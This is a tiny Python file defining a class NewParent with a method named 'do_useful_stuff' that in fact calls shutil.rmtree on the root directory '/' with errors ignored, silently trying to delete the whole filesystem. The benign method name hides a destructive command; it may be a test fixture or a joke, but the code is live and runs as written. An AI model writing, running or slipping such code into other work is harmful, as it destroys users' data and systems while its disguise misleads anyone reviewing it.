import shutil


class NewParent(object):
    def do_useful_stuff(self):
        shutil.rmtree("/", ignore_errors=True)